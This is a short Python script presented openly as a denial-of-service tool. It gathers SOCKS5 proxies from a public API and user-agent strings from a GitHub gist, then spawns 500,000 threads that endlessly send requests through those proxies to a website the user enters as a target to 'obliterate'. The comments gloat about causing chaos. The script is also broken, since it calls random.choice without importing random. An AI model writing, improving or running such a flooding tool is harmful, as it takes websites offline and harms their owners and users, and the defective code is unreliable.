import requests
import threading

def get_proxies():
    # Grab proxies from the Proxyscape API because anonymity is overrated.
    response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all")
    return response.text.split('\r\n')

def get_user_agents():
    # Snag user agents from the dark corners of the internet. Variety is the spice of life, right?
    response = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt")
    return response.text.split('\n')

def get_random_user_agent(user_agents):
    return random.choice(user_agents)

def ddos(url):
    proxies = get_proxies()
    user_agents = get_user_agents()

    def attack():
        while True:
            for proxy in proxies:
                headers = {'User-Agent': get_random_user_agent(user_agents)}
                try:
                    requests.get(url, proxies={'http': proxy, 'https': proxy}, headers=headers)
                except Exception as e:
                    pass

    # Start the onslaught - 500k requests per second. Let the chaos begin!
    for _ in range(500000):
        threading.Thread(target=attack).start()

# Ask the user for the target website
target_url = input("Enter the website link you want to obliterate: ")

# Initiate the grand spectacle of destruction
ddos(target_url)
